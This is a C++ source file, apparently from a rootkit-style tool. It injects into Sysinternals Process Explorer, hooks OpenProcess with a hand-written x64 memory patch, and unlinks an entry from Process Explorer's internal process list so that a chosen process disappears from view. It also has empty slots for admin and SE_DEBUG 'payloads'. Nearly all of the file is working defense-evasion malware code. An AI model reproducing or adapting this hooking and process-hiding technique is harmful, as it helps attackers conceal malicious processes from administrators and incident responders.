#include "stdafx.h"
#include "Procexp.h"


Procexp::Procexp(std::wstring targetProcess)
{
//	myProcess = this->targetProcAddr;
}

void Procexp::DoActions()
{
	if (processRights->admin)
	{
		//Admin related payloads here
	}
	else if (processRights->debug)
	{
		//SE_DEBUG related payloads here
	}

	RegisterHook(Procexp::HideProcessHook, L"kernel32.dll", "OpenProcess");
}

void Procexp::Patch(void* hook, void* jmpAddr)
{
#ifdef _WIN64
	DWORD oldP;
	//Make Memory Protection R_X_W
	VirtualProtect((void*)jmpAddr, sizeof(MOVABS) + sizeof(DWORD64) + sizeof(CALL_EAX), PAGE_EXECUTE_READWRITE, &oldP);
		ZeroMemory((void*)jmpAddr, sizeof(MOVABS) + sizeof(DWORD64) + sizeof(CALL_EAX) - 4);
		//Build eax with address of hook
		*((WORD*)jmpAddr) = MOVABS;
		*(DWORD64*)((BYTE*)jmpAddr + sizeof(MOVABS) - 2) = (int64_t)hook;
		//Add 4th parameter to hook
		*(DWORD*)((BYTE*)jmpAddr + (sizeof(MOVABS) + sizeof(DWORD64) - 2)) = MOV_R9_R14;
		//call rax
		*(WORD*)((BYTE*)jmpAddr + (sizeof(MOVABS) + sizeof(DWORD64) + sizeof(MOV_R9_R14)-3)) = CALL_EAX;
	//Restore Protection
	VirtualProtect((void*)jmpAddr, sizeof(MOVABS) + sizeof(DWORD64) + sizeof(CALL_EAX), oldP, &oldP);
#else
	//x86 relative jmp
#endif
}

//
//Once dll is injected, there are several ways to hide our process from Procexp. This method is ideal for working across multiple
//versions of Procexp, since rather than patching offsets and specific functions that could change, we are patching 
//OpenProcess API, which is repetetively called by procexp and leaves a pointer (r14 in x64) pointing to its linked list of processes
//that is a structure less likely to be changed in a problematic way. Because of this, we must do as much validation to the r14 pointer
//as possible to avoid dereferencing bad memory from other cases OpenProcess is called.
//
HANDLE Procexp::HideProcessHook(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId, process_explorer_proc_obj* procObj)
{
	MEMORY_BASIC_INFORMATION mbi;
	DWORD procId = dwProcessId;
	if (VirtualQuery(_ReturnAddress(), &mbi, sizeof(mbi)))
	{
		//Only hook if call originated from procexp memory space - catching all calls gets messy (see above function comment)
		if (GetModuleHandle(Procexp::fileName.c_str()) == (HMODULE)mbi.AllocationBase)
		{
			HANDLE procHandle = NULL;

			//validated our target r14 object (linked list of procs)
			if (procObj != NULL && 
				(procObj->proc_id % 4 == 0 && (int)procObj->proc_id < 0xffff) && //PID field is divisible by 4 and proc ID is under reasonible threshold
				(procObj->flink_offset < 0xffff && procObj->flink_offset > 0xff) && //flink_offset should probably not be over 0xffff - filter this
				(DWORD64)procObj->proc_name > 0xffffffff) //on x64, proc_name is often in higher memory regions than this threshold
			{
				process_explorer_proc_obj* next = (process_explorer_proc_obj*)((DWORD64)procObj + procObj->flink_offset);
				std::wstring targetProcName = (wchar_t*)(next->proc_name);
				if (targetProcName == L"System")
				{
					//Skip link that has our target process to hide
					procObj->flink_offset += (DWORD)next->flink_offset;

					//return next process ID - not ours
					procId = procObj->proc_id;
				}
			}
		}
	}
	
    return ((OpenProcessFunc)Procexp::targetProcAddr)(dwDesiredAccess, bInheritHandle, procId);
}

Procexp::~Procexp()
{
}
